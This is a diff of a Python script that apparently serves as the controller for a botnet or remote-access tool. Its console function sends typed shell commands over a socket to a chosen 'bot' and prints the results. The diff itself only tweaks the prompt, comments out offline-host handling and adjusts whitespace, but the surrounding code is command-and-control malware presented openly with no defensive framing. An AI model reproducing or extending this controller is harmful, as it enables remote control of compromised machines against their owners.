@@ -52,7 +52,7 @@ def console(conn,bot,socket_target):
     print("\n====Target::({})====".format(bot))
 
     while True:
-        commands=input("SHELL>")
+        commands=input("SHELL> ")
         a={bot:commands}
         if commands=='exit':
             return 0
@@ -60,13 +60,13 @@ def console(conn,bot,socket_target):
             commands = bytes(commands, 'utf-8')
             conn.sendall(commands) # Otherwise we will send the command to the target
             out=conn.recv(64000).decode('utf-8') # and print the result that we got back
-
-            if out=="Dead":
-                print(bcolors.FAIL,"====Host:{} went offline===".format(bot))
-                del conn_list[socket_target]
-                return 0
-            else:
-                print(out)
+            print(out)
+           # if out=="Dead":
+            #    print(bcolors.FAIL,"====Host:{} went offline===".format(bot))
+            #    del conn_list[socket_target]
+            #    return 0
+            #else:
+                #print(out)
 
 
 
@@ -78,7 +78,7 @@ def banner():
     print("██║     ██╔══██║██╔══██║██║   ██║╚════██║██╔═══╝ ")
     print("╚██████╗██║  ██║██║  ██║╚██████╔╝███████║███████╗")
     print(" ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝")
-    print("")
+    print("")                               
 
 def main():
     banner()
